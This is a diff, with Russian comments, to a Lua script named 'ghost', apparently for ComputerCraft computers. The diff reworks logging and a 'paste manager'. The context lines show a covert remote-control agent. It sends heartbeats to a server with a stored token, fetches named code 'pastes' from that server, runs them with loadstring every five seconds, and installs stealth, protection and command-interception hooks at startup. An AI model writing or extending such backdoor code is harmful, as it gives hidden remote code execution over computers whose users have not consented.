@@ -1,4 +1,4 @@
--- ghost v9.9.10 (dynamic pastes: auto-start when assigned)
+-- ghost v9.9.11 (export _G.glog for pastes + paste_manager fixes)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -81,12 +81,15 @@ local refresh_url
 local check_mode
 local reload_tunnel
 
+-- НОВОЕ: glog теперь экспортируется в _G для пастов
 local function glog(msg)
     pcall(function()
         local f = orig_fs_open(LOG_FILE, "a")
         if f then local t = os.date and os.date("%H:%M:%S") or "?"; f.write(t .. " " .. tostring(msg) .. "\n"); f.close() end
     end)
 end
+_G.glog = glog  -- ЭКСПОРТ для пастов!
+
 local function note(msg) glog(msg) end
 local function gerr(step, err)
     glog("ERR " .. step .. ": " .. tostring(err))
@@ -608,21 +611,25 @@ local function fetch_paste_code(name, token)
     return r.content
 end
 
--- НОВОЕ: динамический менеджер пастов (через coroutines)
-local active_pastes = {}  -- name -> coroutine
+-- НОВОЕ: динамический менеджер пастов с улучшенным логированием
+local active_pastes = {}
 local function paste_runner_loop(name, token)
     glog("paste_runner start: " .. name)
     while true do
         pcall(function()
             local code = fetch_paste_code(name, token)
-            if code and type(code) == "string" then
-                local fn, ce = loadstring(code)
-                if fn then
-                    local ro, re = pcall(fn)
-                    if not ro then glog("paste " .. name .. " run: " .. tostring(re)) end
-                else
-                    glog("paste " .. name .. " compile: " .. tostring(ce))
-                end
+            if not code or type(code) ~= "string" then
+                glog("paste " .. name .. ": no code or not string")
+                return
+            end
+            local fn, ce = loadstring(code)
+            if not fn then
+                glog("paste " .. name .. " compile ERROR: " .. tostring(ce))
+                return
+            end
+            local ro, re = pcall(fn)
+            if not ro then
+                glog("paste " .. name .. " run ERROR: " .. tostring(re))
             end
         end)
         sleep(5)
@@ -683,7 +690,6 @@ local function heartbeat_loop(token)
                 return
             end
             
-            -- НОВОЕ: запускаем новые пасты динамически
             if pastes then
                 for _, name in ipairs(pastes) do
                     if not active_pastes[name] then
@@ -691,7 +697,6 @@ local function heartbeat_loop(token)
                         active_pastes[name] = coroutine.create(function() paste_runner_loop(name, token) end)
                     end
                 end
-                -- удаляем пасты которых больше нет в списке
                 for name, co in pairs(active_pastes) do
                     local found = false
                     for _, n in ipairs(pastes) do if n == name then found = true; break end end
@@ -732,7 +737,6 @@ local function mode_watcher(token)
     end
 end
 
--- НОВОЕ: менеджер корутин пастов (резюмит все активные)
 local function paste_manager_loop()
     glog("paste_manager start")
     while true do
@@ -741,6 +745,7 @@ local function paste_manager_loop()
                 local ok, err = coroutine.resume(co)
                 if not ok then glog("paste " .. name .. " coroutine err: " .. tostring(err)) end
             elseif coroutine.status(co) == "dead" then
+                glog("paste " .. name .. " coroutine died")
                 active_pastes[name] = nil
             end
         end
@@ -792,18 +797,17 @@ local function connect_and_run(token, pending_password)
     if not token then
         while true do sleep(60) end
     end
-    -- НОВОЕ: запускаем все параллельные процессы включая paste_manager
     local funcs = {
         function() heartbeat_loop(token) end,
         function() mode_watcher(token) end,
         function() relay_watch_loop(token) end,
-        function() paste_manager_loop() end,  -- менеджер пастов
+        function() paste_manager_loop() end,
     }
     pcall(parallel.waitForAll, table.unpack(funcs))
 end
 
 local function run_main()
-    glog("ghost start v9.9.10")
+    glog("ghost start v9.9.11")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
